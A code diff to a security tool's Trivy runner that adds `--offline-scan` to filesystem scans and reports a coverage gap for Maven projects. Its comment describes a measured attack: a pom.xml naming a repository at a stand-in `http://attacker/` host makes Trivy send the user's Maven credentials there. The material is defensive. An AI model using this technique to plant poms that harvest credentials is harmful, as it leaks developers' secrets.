@@ -47,6 +47,38 @@
  * (not the working directory), so `.guardianignore`'s native flags keep
  * working. `test/unit/runners/trivyRun.test.ts` fails when any spawn in
  * `src/` names Trivy outside this file.
+ *
+ * ---- A pom.xml does not choose where Trivy fetches, or your credentials ----
+ *
+ * `trivy fs` resolves a Maven `pom.xml`'s transitive dependencies by
+ * fetching each one's POM over the network, and the repository's own
+ * `pom.xml` chooses from where. Measured on Trivy 0.74.0 (2026-10-27) with a
+ * local HTTP server and a temporary `HOME` holding a `~/.m2/settings.xml`:
+ *
+ *   - a `pom.xml` (or a parent POM it ships) declaring
+ *     `<repositories><repository><id>evil</id><url>http://attacker/</url>` made
+ *     `trivy fs` fetch every dependency's POM from the attacker's host — an
+ *     egress to a host the repository chose, carrying the project's
+ *     dependency coordinates; and when the user's `~/.m2/settings.xml` held a
+ *     `<server><id>evil>` it sent that server's user name and password with
+ *     each request (Basic). The same name-binding attack as NuGet. A remote
+ *     `<parent>` was fetched the same way; a bare project went to Maven
+ *     Central, and a `<distributionManagement>` or a profile `<repository>`
+ *     did not redirect the resolution.
+ *   - `--offline-scan` stopped every one of those requests (the attacker's
+ *     and Maven Central's alike). Its cost, measured on a plain pom: Trivy
+ *     then reports only the directly declared dependencies, not the
+ *     transitive ones it would otherwise fetch (a `commons-text:1.9` kept its
+ *     own finding; the `commons-lang3:3.11` it pulls in was gone). Lock-based
+ *     ecosystems (npm, composer, cargo, …) read their complete lock files and
+ *     are unaffected.
+ *
+ * So every `trivy fs`-family scan is given `--offline-scan`: no scanned
+ * repository's pom can send a request, or a credential, to a host of its
+ * choosing. Where Trivy still scanned a `pom.xml` the loss of transitive
+ * resolution is a named partial gap, never a clean pass
+ * ({@link TRIVY_MAVEN_OFFLINE_GAP}, in {@link judgeTrivyFs}). A user who
+ * trusts a Maven repository resolves it with a real build themselves.
  */
 
 import { commandFor } from '../platform/binaryPath.js';
@@ -110,6 +142,14 @@ function projectTrivyIgnore(projectPath: string): string | null {
   return projectEntryKindIn(projectPath, PROJECT_TRIVYIGNORE) === 'file' ? join(projectPath, PROJECT_TRIVYIGNORE) : null;
 }
 
+/**
+ * Subcommands that resolve dependencies from a tree and so accept
+ * `--offline-scan` — a scan over the repository's own files, where its
+ * `pom.xml` must not choose where Trivy fetches (see the module comment). An
+ * `image`/`config` scan is not one.
+ */
+const OFFLINE_SCAN_SUBCOMMANDS: ReadonlySet<string> = new Set(['fs', 'filesystem', 'repo', 'repository', 'rootfs']);
+
 /** The argv of one run — pure, for the tests. */
 export function trivyArgv(
   inv: Pick<TrivyInvocation, 'args' | 'target'>,
@@ -117,8 +157,10 @@ export function trivyArgv(
   ignoreFile: string | null,
   version: string | null = null,
 ): string[] {
+  const offline = OFFLINE_SCAN_SUBCOMMANDS.has(inv.args[0] ?? '') ? ['--offline-scan'] : [];
   return [
     ...inv.args,
+    ...offline,
     ...(acceptsNoPhoneHomeFlags(version) ? NO_PHONE_HOME_FLAGS : []),
     '--config',
     configPath,
@@ -413,6 +455,17 @@ export function withHonoured(
 /** Listed missing when the manifest walk stopped early: see {@link judgeTrivyFs}. */
 export const TRIVY_MANIFEST_WALK_GAP = 'trivy:manifest-walk';
 
+/** Listed missing when Trivy scanned a `pom.xml` under `--offline-scan`: its transitive dependencies were not resolved (see the module comment). */
+export const TRIVY_MAVEN_OFFLINE_GAP = 'trivy:maven-offline';
+
+/** Whether a completed Trivy run's JSON scanned a Maven `pom.xml` (a `pom`-type Result): then its transitive deps were not resolved offline. */
+function scannedAPom(raw: string | null): boolean {
+  if (raw === null) return false;
+  const parsed = parseInputAsJson(raw);
+  const results = asArray(getProp(parsed, 'Results'));
+  return results.some((r) => getString(r, 'Type') === 'pom');
+}
+
 /** What one `trivy fs` dependency pass adds to a scan's bookkeeping. */
 export interface TrivyFsJudgement {
   toolRun: ToolRun;
@@ -470,15 +523,24 @@ export function judgeTrivyFs(args: {
   const walkNote =
     coverage.walkIncomplete !== undefined ? `${coverage.walkIncomplete} — manifests below were not checked` : null;
   const walkGap = walkNote !== null ? [TRIVY_MANIFEST_WALK_GAP] : [];
+  // A pom.xml Trivy scanned offline: only its directly declared dependencies
+  // were read, not the transitive ones it would fetch (the module comment —
+  // a repository's pom must not choose where Trivy fetches, or your
+  // credentials). A named gap, never a clean Maven pass.
+  const mavenNote = scannedAPom(raw)
+    ? 'a pom.xml was scanned with --offline-scan, so its transitive Maven dependencies were not resolved — ' +
+      'resolve them with a Maven build you trust and re-run'
+    : null;
+  const mavenGap = mavenNote !== null ? [TRIVY_MAVEN_OFFLINE_GAP] : [];
   // A read budget spent is named too; the files past it already count as gaps.
-  const notes = [walkNote, coverage.readNote ?? null].filter((n): n is string => n !== null);
+  const notes = [walkNote, mavenNote, coverage.readNote ?? null].filter((n): n is string => n !== null);
   const note = notes.length > 0 ? notes.join('; ') : null;
   const withNote = (r: ToolRun): ToolRun =>
     withHonoured(note === null ? r : { ...r, reason: r.reason !== undefined ? `${r.reason}; ${note}` : note }, run);
   if (coverage.gaps.length > 0 && coverage.sawAnyResults) {
     return {
       toolRun: withNote({ name: 'trivy', status: 'ok', reason: 'no_supported_manifest' }),
-      missing: [...coverage.gaps.map((g) => `trivy:${g.ecosystem}`), ...walkGap],
+      missing: [...coverage.gaps.map((g) => `trivy:${g.ecosystem}`), ...walkGap, ...mavenGap],
       gaps: coverage.gaps,
     };
   }
@@ -489,5 +551,5 @@ export function judgeTrivyFs(args: {
       gaps: coverage.gaps,
     };
   }
-  return { toolRun: withNote({ name: 'trivy', status: 'ok' }), missing: walkGap, gaps: [] };
+  return { toolRun: withNote({ name: 'trivy', status: 'ok' }), missing: [...walkGap, ...mavenGap], gaps: [] };
 }
